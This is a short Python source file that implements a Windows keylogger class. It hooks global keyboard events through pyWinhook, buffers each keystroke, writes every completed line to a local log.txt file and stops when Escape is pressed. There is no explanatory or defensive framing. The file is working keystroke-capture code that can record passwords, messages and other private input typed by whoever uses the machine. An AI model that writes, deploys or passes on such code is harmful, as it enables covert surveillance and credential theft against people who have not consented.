import pyWinhook as pyHook
import pythoncom, sys, logging


class KeyLogger:

    buffer = ""
    file_log = "./log.txt"

    def __init__(self):
        self.init_log()
        

    def init_log(self):
        logging.basicConfig(filename=self.file_log, level=logging.DEBUG, format='%(message)s')

    def KeyboardEvent(self, event):
        if event.Ascii == 13:
            logging.log(10, self.buffer)
            self.buffer = ""
        elif event.Ascii == 27:
            exit(0)
        else:
            self.buffer += chr(event.Ascii)
        return True

    def keyCapture(self):
        hooks_manager = pyHook.HookManager()
        hooks_manager.KeyDown = self.KeyboardEvent
        hooks_manager.HookKeyboard()
        pythoncom.PumpMessages()


key_logger = KeyLogger()
key_logger.keyCapture()